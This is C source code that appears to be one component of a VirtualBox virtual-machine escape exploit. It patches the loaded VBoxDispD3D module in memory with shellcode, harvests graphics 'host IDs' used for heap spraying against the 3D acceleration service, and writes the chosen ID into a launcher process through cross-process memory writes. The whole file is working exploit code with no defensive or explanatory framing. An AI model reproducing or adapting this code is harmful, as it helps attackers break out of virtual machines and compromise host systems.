#include <Windows.h>
#include <stdio.h>

/* _Constants.cpp */
extern CHAR launcherProcessName[];
extern BYTE gPatch[];
extern enum patch_size gPatchSize;
extern ULONGLONG gPatchShellcodeAddrOffset;
extern ULONGLONG gPatchOffset;
extern BYTE gSavedBytes[];
extern const DWORD gLastValidHostId;

DWORD gHostId = 0;
PBYTE gPatchAddr = 0;

extern VOID Shellcode();
extern DWORD GetPidByName(PCHAR name);

VOID WriteHostIdToLauncherMemory(PVOID ptr) {
	DWORD pid = GetPidByName(launcherProcessName);
	if (pid == 0) {
		MessageBox(NULL, "[-] Failed to get PID of the launcher process", "Host ID Hijacker", MB_OK);
		return;
	}

	HANDLE hProcess = hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
	if (!hProcess) {
		CHAR buf[64] = { 0 };
		sprintf_s(buf, sizeof(buf), "[-] Failed to open the launcher process. Error: %08X", GetLastError());
		MessageBox(NULL, buf, "Host ID Hijacker", MB_OK);
		return;
	}

	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(hProcess, ptr, &gHostId, sizeof(gHostId), &bytesWritten) || bytesWritten != sizeof(gHostId)) {
		MessageBox(NULL, "[-] Failed to write Host ID to the launcher process", "Host ID Hijacker", MB_OK);
		return;
	}
}

VOID RestoreBytes() {
	memcpy(gPatchAddr, gSavedBytes, gPatchSize);
}

VOID PatchBytes() {
	memcpy(gPatchAddr, gPatch, gPatchSize);
}

VOID SaveBytes() {
	memcpy(gSavedBytes, gPatchAddr, gPatchSize);
}

VOID SetShellcodeAddr() {
	*(PVOID*)(gPatch + gPatchShellcodeAddrOffset) = Shellcode;
}

VOID SetPatchAddr(HMODULE vboxDispD3D) {
	gPatchAddr = (PBYTE)vboxDispD3D + gPatchOffset;
}

VOID HijackHostId(PVOID launcherProcessMemory) {
	HMODULE vboxDispD3D = GetModuleHandle("VBoxDispD3D");
	if (!vboxDispD3D) {
		MessageBox(NULL, "[-] Failed to obtain the base of VBoxDispD3D", "Host ID Hijacker", MB_OK);
		return;
	}

	SetPatchAddr(vboxDispD3D);
	SetShellcodeAddr();

	DWORD oldProtect;
	if (!VirtualProtect(gPatchAddr, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		MessageBox(NULL, "[-] Failed to change memory permissions", "Host ID Hijacker", MB_OK);
		return;
	}

	SaveBytes();
	PatchBytes();

	/* The tricky part: we must capture at least 4 different host IDs,
	 * the greatest one will be our host ID.
	 * It is because VBoxDispD3D uses several consequent host IDs e.g. from 54 to 57, 
	 * and when we occasionally take the smallest and pass it to MySendCrCmdFlip 
	 * the H3DORInstance spraying stops to work (and triggers new bugs).
	*/
#define HOST_ID_COUNT 4
	DWORD hostIds[HOST_ID_COUNT] = {0};
	for (DWORD i = 0; i < 4; i++) {

		// Wait for a new Host ID.
		for (DWORD j = 0; j < 10; j++) {
			if (gHostId != 0) {
				// New ID has been hijacked by the shellcode.
				break;
			}

			Sleep(100);
		}

		if (gHostId != 0) {
			// No need to worry about skipped hostIds' entries, 
			// they are initialized as zeroes which is invalid.
			hostIds[i] = gHostId;
			gHostId = 0;
		}

		// If the shellcode has hijacked a host ID, we have to patch
		// the original bytes again.
		PatchBytes();

		Sleep(1000);
	}

	// Find the greatest ID to be sure we will not use the smallest one
	// Another observation is when Host ID is too big compared to others,
	// it is invalid also. Normal range is below 100 or so, at least on my machines.
	DWORD maxHostId = 0;
	for (DWORD i = 0; i < HOST_ID_COUNT; i++) {
		if (hostIds[i] > maxHostId && hostIds[i] < gLastValidHostId) {
			maxHostId = hostIds[i];
		}
	}

	// At last, set the max Host ID as true Host ID
	gHostId = maxHostId;

	if (gHostId == 0) {
		RestoreBytes();
		MessageBox(NULL, "[-] Failed to hijack Host ID", "Host ID Hijacker", MB_OK);
		return;
	}

	WriteHostIdToLauncherMemory(launcherProcessMemory);
}